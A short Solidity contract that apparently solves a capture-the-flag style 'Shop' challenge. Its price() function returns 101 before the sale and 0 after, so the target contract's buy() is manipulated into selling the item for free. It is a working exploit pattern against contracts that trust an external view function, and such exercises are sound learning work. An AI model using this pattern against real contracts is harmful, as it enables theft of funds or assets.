// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopSolution {
    Shop shop;

    constructor(address _shop ) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 101;
        }
        return 0;
    }

    function solve() external {
        shop.buy();
    }
}